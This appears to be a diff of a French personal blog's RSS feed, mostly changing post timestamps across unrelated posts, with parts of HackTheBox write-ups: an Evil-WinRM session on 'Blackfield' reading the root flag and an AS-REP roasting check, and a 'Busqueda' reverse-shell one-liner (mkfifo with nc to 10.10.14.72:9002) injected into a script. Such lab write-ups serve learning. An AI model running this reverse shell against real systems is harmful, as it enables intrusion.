+	Info: Establishing connection to remote endpoint
+	*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ..
+	*Evil-WinRM* PS C:\Users\Administrator&gt; cd desktop
+	*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; cat root.txt
+	4375a629c7c67c8e29db269060c955cb
+	*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; 
+
+## Plus loin
+
+On peut vérifier que le compte _support_ est bien &quot;vulnérable&quot; à l&#39;attaque AR-REP Roasting. DoesNotRequirePreAuth est bien activé.
+
+	*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; get-aduser support -prop DoesNotRequirePreAuth
+	
+	DistinguishedName     : CN=support,CN=Users,DC=BLACKFIELD,DC=local
+	DoesNotRequirePreAuth : True
+	Enabled               : True
+	GivenName             :
+	Name                  : support
+	ObjectClass           : user
+	ObjectGUID            : ae4911cf-203d-443d-96f8-1b8d7b250d3e
+	SamAccountName        : support
+	SID                   : S-1-5-21-4194615774-2175524697-3563712290-1104
+	Surname               :
+	UserPrincipalName     :</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/2022-02-17-blackfield-hackthebox.txt</guid>
+  </item>
+<item>
+<pubDate>2023-08-17T11:24:56Z 08:06:09 CET</pubDate>
   <category>2023/08/17/4</category>
   <title>htb Busqueda</title>
   <link>http://3r1c.net/posts/2023-08-17-busqueda.txt</link>
@@ -1996,8 +2402,7 @@ Je découvre grâce au code que l&#39;option full-checkup lance un script `./ful
 On peut insérer un reverse shell dans `/tmp/full-checkup.sh`.
 
 ```
-echo -en &quot;#! /bin/bash
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.72 9002 &gt;/tmp/f&quot; &gt; /tmp/full-checkup.sh
+echo -en &quot;#! /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.72 9002 &gt;/tmp/f&quot; &gt; /tmp/full-checkup.sh
 ```
 
 Puis :
@@ -2018,7 +2423,7 @@ $ nc -nlvp 9002
   <guid>http://3r1c.net/posts/2023-08-17-busqueda.txt</guid>
   </item>
 <item>
-<pubDate>2023-10-04 20:07:22 CET</pubDate>
+<pubDate>2023-10-04 08:06:09 CET</pubDate>
   <category>2023/10/04/3</category>
   <title>Recommandations de recharge de véhicule électrique</title>
   <link>http://3r1c.net/posts/2023-10-04-reco-recharge-vehicule-electrique.txt</link>
@@ -2036,7 +2441,7 @@ batterie d&#39;un véhucule électrique afin de conserver un bon niveau de sant�
   <guid>http://3r1c.net/posts/2023-10-04-reco-recharge-vehicule-electrique.txt</guid>
   </item>
 <item>
-<pubDate>2023-10-08 20:07:22 CET</pubDate>
+<pubDate>2023-10-08 08:06:09 CET</pubDate>
   <category>2023/10/08/7</category>
   <title>Véhicule électrique : un véhicule vert ?</title>
   <link>http://3r1c.net/posts/2023-10-08-vehicule-electrique-vert.txt</link>
@@ -2061,7 +2466,7 @@ votre VE :)</pre>]]>
   <guid>http://3r1c.net/posts/2023-10-08-vehicule-electrique-vert.txt</guid>
   </item>
 <item>
-<pubDate>2023-10-31 20:07:22 CET</pubDate>
+<pubDate>2023-10-31 08:06:09 CET</pubDate>
   <category>2023/10/31/2</category>
   <title>Halloween petites infos</title>
   <link>http://3r1c.net/posts/2023-10-31-halloween-cest-quoi.txt</link>
@@ -2102,7 +2507,7 @@ quelques infos. Voilà c&#39;était la minute culturelle du mois :-))</pre>]]>
   <guid>http://3r1c.net/posts/2023-10-31-halloween-cest-quoi.txt</guid>
   </item>
 <item>
-<pubDate>2023-11-02 20:07:22 CET</pubDate>
+<pubDate>2023-11-02 08:06:09 CET</pubDate>
   <category>2023/11/02/4</category>
   <title>Amulette de sommeil</title>
   <link>http://3r1c.net/posts/2023-11-02-amulette-de-sommeil.txt</link>
@@ -2123,7 +2528,7 @@ physique et mental. Mettre tous les ingrédients dans le sachet :
   <guid>http://3r1c.net/posts/2023-11-02-amulette-de-sommeil.txt</guid>
   </item>
 <item>
-<pubDate>2023-11-08 20:07:22 CET</pubDate>
+<pubDate>2023-11-08 08:06:09 CET</pubDate>
   <category>2023/11/08/3</category>
   <title>Le monde de demain (3) - Sans transition</title>
   <link>http://3r1c.net/posts/2023-11-08-le-monde-de-demain-3.txt</link>
@@ -2160,7 +2565,7 @@ vie.</pre>]]>
   <guid>http://3r1c.net/posts/2023-11-08-le-monde-de-demain-3.txt</guid>
   </item>
 <item>
-<pubDate>2023-11-09 20:07:22 CET</pubDate>
+<pubDate>2023-11-09 08:06:09 CET</pubDate>
   <category>2023/11/09/4</category>
   <title>Véhicule électrique vert ? (2)</title>
   <link>http://3r1c.net/posts/2023-11-09-vehicule-electrique-vert-2.txt</link>
@@ -2185,7 +2590,7 @@ chez les autres.</pre>]]>
   <guid>http://3r1c.net/posts/2023-11-09-vehicule-electrique-vert-2.txt</guid>
   </item>
 <item>
-<pubDate>2023-12-02 20:07:22 CET</pubDate>
+<pubDate>2023-12-02 08:06:09 CET</pubDate>
   <category>2023/12/02/6</category>
   <title>email auto hébergé</title>
   <link>http://3r1c.net/posts/2023-11-10-email-auto-heberge.txt</link>
@@ -2242,7 +2647,7 @@ relais smtp de smtp2go.
 # Vim comme éditeur
 set editor = &quot;vim -c &#39;set tw=72&#39; -c &#39;set wrap&#39;&quot;
 set folder=&quot;/var/lib/mail4one/mails/all&quot;
-set mask=&quot;!^\.[^.]&quot;
+set mask=&quot;!^\\.[^.]&quot;
 set mbox=&quot;/var/lib/mail4one/mails/all&quot;
 set record=&quot;+.Sent&quot;
 set postponed=&quot;+.Drafts&quot;
@@ -2711,7 +3116,7 @@ $ mutt -f ~/Mail/Inbox</pre>]]>
   <guid>http://3r1c.net/posts/2023-11-10-email-auto-heberge.txt</guid>
   </item>
 <item>
-<pubDate>2023-11-14 20:07:22 CET</pubDate>
+<pubDate>2023-11-14 08:06:09 CET</pubDate>
   <category>2023/11/14/2</category>
   <title>Dégugeulisation</title>
   <link>http://3r1c.net/posts/2023-11-14-degougueulisation.txt</link>
@@ -2748,7 +3153,7 @@ contact de LineageOS.
   <guid>http://3r1c.net/posts/2023-11-14-degougueulisation.txt</guid>
   </item>
 <item>
-<pubDate>2023-11-15 20:07:22 CET</pubDate>
+<pubDate>2023-11-15 08:06:09 CET</pubDate>
   <category>2023/11/15/3</category>
   <title>Le "savoir procéder"</title>
   <link>http://3r1c.net/posts/2023-11-15-savoir-proceder.txt</link>
@@ -2782,7 +3187,7 @@ malheureusement résolument tournés vers le &quot;savoir faire&quot;. </pre>]]>
   <guid>http://3r1c.net/posts/2023-11-15-savoir-proceder.txt</guid>
   </item>
 <item>
-<pubDate>2023-11-18T21:03:07Z 20:07:22 CET</pubDate>
+<pubDate>2023-11-18T21:03:07Z 08:06:09 CET</pubDate>
   <category>2023/11/18/6</category>
   <title>Shinobi website</title>
   <link>http://3r1c.net/posts/2023-11-18-shinobi-website.txt</link>
@@ -2819,7 +3224,7 @@ caractères ; sélectionner les lignes avec SHIFT+V, puis : `gq`.</pre>]]>
   <guid>http://3r1c.net/posts/2023-11-18-shinobi-website.txt</guid>
   </item>
 <item>
-<pubDate>2023-11-19T17:35:10Z 20:07:22 CET</pubDate>
+<pubDate>2023-11-19T17:35:10Z 08:06:09 CET</pubDate>
   <category>2023/11/19/7</category>
   <title>La vie en rose ukulélé</title>
   <link>http://3r1c.net/posts/2023-11-19-la-vie-en-rose.txt</link>
@@ -2898,7 +3303,7 @@ Alors je sens en moi, mon coeur qui bat...</pre>]]>
   <guid>http://3r1c.net/posts/2023-11-19-la-vie-en-rose.txt</guid>
   </item>
 <item>
-<pubDate>2023-11-19 20:07:22 CET</pubDate>
+<pubDate>2023-11-19 08:06:09 CET</pubDate>
   <category>2023/11/19/7</category>
   <title>Le monde de demain (4) - Ce que le monde redoute</title>
   <link>http://3r1c.net/posts/2023-11-19-le-monde-de-demain-4.txt</link>
@@ -2940,7 +3345,7 @@ pour l&#39;ensemble des vivants de la planète.</pre>]]>
   <guid>http://3r1c.net/posts/2023-11-19-le-monde-de-demain-4.txt</guid>
   </item>
 <item>
-<pubDate>2023-11-25T15:30:25Z 20:07:22 CET</pubDate>
+<pubDate>2023-11-25T15:30:25Z 08:06:09 CET</pubDate>
   <category>2023/11/25/6</category>
   <title>Plain text journaling</title>
   <link>http://3r1c.net/posts/2023-11-25-plain-text-journaling.txt</link>
@@ -3091,7 +3496,7 @@ https://peppe.rs/posts/plain_text_journaling/</pre>]]>
   <guid>http://3r1c.net/posts/2023-11-25-plain-text-journaling.txt</guid>
   </item>
 <item>
-<pubDate>2023-12-08T13:11:20Z 20:07:22 CET</pubDate>
+<pubDate>2023-12-08T13:11:20Z 08:06:09 CET</pubDate>
   <category>2023/12/08/5</category>
   <title>DWM</title>
   <link>http://3r1c.net/posts/2023-12-08-dwm.txt</link>
@@ -3221,7 +3626,7 @@ static const Key keys[] = {
   <guid>http://3r1c.net/posts/2023-12-08-dwm.txt</guid>
   </item>
 <item>
-<pubDate>2023-12-13T21:11:20Z 20:07:22 CET</pubDate>
+<pubDate>2023-12-13T21:11:20Z 08:06:09 CET</pubDate>
   <category>2023/12/13/3</category>
   <title>Historique de ce site, du web 1.0 au 3.0</title>
   <link>http://3r1c.net/posts/2023-12-13-historique.txt</link>
@@ -3296,7 +3701,7 @@ surpuissante pour le visiter.</pre>]]>
   <guid>http://3r1c.net/posts/2023-12-13-historique.txt</guid>
   </item>
 <item>
-<pubDate>2023-11-18T11:24:56Z 20:07:22 CET</pubDate>
+<pubDate>2023-11-18T11:24:56Z 08:06:09 CET</pubDate>
   <category>2023/11/18/6</category>
   <title>Antisèche vim</title>
   <link>http://3r1c.net/posts/anti-seche-vim.txt</link>
@@ -3459,7 +3864,7 @@ sh -c &#39;curl -fLo &quot;${XDG_DATA_HOME:-$HOME/.local/share}&quot;/nvim/site/
   <guid>http://3r1c.net/posts/anti-seche-vim.txt</guid>
   </item>
 <item>
-<pubDate>2022-07-18T11:24:56Z 20:07:22 CET</pubDate>
+<pubDate>2022-07-18T11:24:56Z 08:06:09 CET</pubDate>
   <category>2022/07/18/1</category>
   <title>Chiffrer ses backups dans le cloud</title>
   <link>http://3r1c.net/posts/chiffrement-des-backups-dans-le-cloud.txt</link>
@@ -3516,7 +3921,7 @@ Tags: backup, cloud, rclone, gocryptfs</pre>]]>
   <guid>http://3r1c.net/posts/chiffrement-des-backups-dans-le-cloud.txt</guid>
   </item>
 <item>
-<pubDate>2021-03-18T11:24:56Z 20:07:22 CET</pubDate>
+<pubDate>2021-03-18T11:24:56Z 08:06:09 CET</pubDate>
   <category>2021/03/18/4</category>
   <title>Configurer un umask + securisé</title>
   <link>http://3r1c.net/posts/configurer-un-umask-plus-securise.txt</link>
@@ -3604,7 +4009,7 @@ Tags: linux, security, umask, ansible</pre>]]>
   <guid>http://3r1c.net/posts/configurer-un-umask-plus-securise.txt</guid>
   </item>
 <item>
-<pubDate>2023-10-16T18:04:21Z 20:07:22 CET</pubDate>
+<pubDate>2023-10-16T18:04:21Z 08:06:09 CET</pubDate>
   <category>2023/10/16/1</category>
   <title>De-googlisation</title>
   <link>http://3r1c.net/posts/degougueulisation.txt</link>
@@ -3652,7 +4057,7 @@ VPS en tant que relai smtp. Ca ne simplifie pas les choses.</pre>]]>
   <guid>http://3r1c.net/posts/degougueulisation.txt</guid>
   </item>
 <item>
-<pubDate>2018-01-02T11:24:56Z 20:07:22 CET</pubDate>
+<pubDate>2018-01-02T11:24:56Z 08:06:09 CET</pubDate>
   <category>2018/01/02/2</category>
   <title>[en] eCPPT course and exam review</title>
   <link>http://3r1c.net/posts/ecppt-course-and-exam-review.txt</link>
@@ -3722,7 +4127,7 @@ Tags: eCPPT, pentest</pre>]]>
   <guid>http://3r1c.net/posts/ecppt-course-and-exam-review.txt</guid>
   </item>
 <item>
-<pubDate>2023-10-26T10:20:00Z 20:07:22 CET</pubDate>
+<pubDate>2023-10-26T10:20:00Z 08:06:09 CET</pubDate>
   <category>2023/10/26/4</category>
   <title>How to Hire Me</title>
   <link>http://3r1c.net/posts/how-to-hire-me.txt</link>
@@ -3765,7 +4170,7 @@ Please do not send email to my work accounts.</pre>]]>
   <guid>http://3r1c.net/posts/how-to-hire-me.txt</guid>
   </item>
 <item>
-<pubDate>2023-10-01 20:07:22 CET</pubDate>
+<pubDate>2023-10-01 08:06:09 CET</pubDate>
   <category>2023/10/01/7</category>
   <title>Brouillon pour "le monde de demain"</title>
   <link>http://3r1c.net/posts/le-monde-de-demain-draft.txt</link>
@@ -3783,7 +4188,7 @@ sinon ce serait pas drôle :)
   <guid>http://3r1c.net/posts/le-monde-de-demain-draft.txt</guid>
   </item>
 <item>
-<pubDate>2020-06-18T11:24:56Z 20:07:22 CET</pubDate>
+<pubDate>2020-06-18T11:24:56Z 08:06:09 CET</pubDate>
   <category>2020/06/18/4</category>
   <title>Home made  nas</title>
   <link>http://3r1c.net/posts/nas-maison-raspberry-pi4-quad-sata.txt</link>
@@ -3979,7 +4384,7 @@ Et cette fois-ci je peux monter le raid :
   <guid>http://3r1c.net/posts/nas-maison-raspberry-pi4-quad-sata.txt</guid>
   </item>
 <item>
-<pubDate>2021-11-18T11:24:56Z 20:07:22 CET</pubDate>
+<pubDate>2021-11-18T11:24:56Z 08:06:09 CET</pubDate>
   <category>2021/11/18/4</category>
   <title>Outils et services</title>
   <link>http://3r1c.net/posts/outils-et-services.txt</link>
@@ -4029,7 +4434,7 @@ Et cette fois-ci je peux monter le raid :
   <guid>http://3r1c.net/posts/outils-et-services.txt</guid>
   </item>
 <item>
-<pubDate>2023-11-07T11:24:56Z 20:07:22 CET</pubDate>
+<pubDate>2023-11-07T11:24:56Z 08:06:09 CET</pubDate>
   <category>2023/11/07/2</category>
   <title>Wrap Existing Text at 80 Characters in Vim</title>
   <link>http://3r1c.net/posts/wrap-existing-test-at-80-char-in-vim.txt</link>
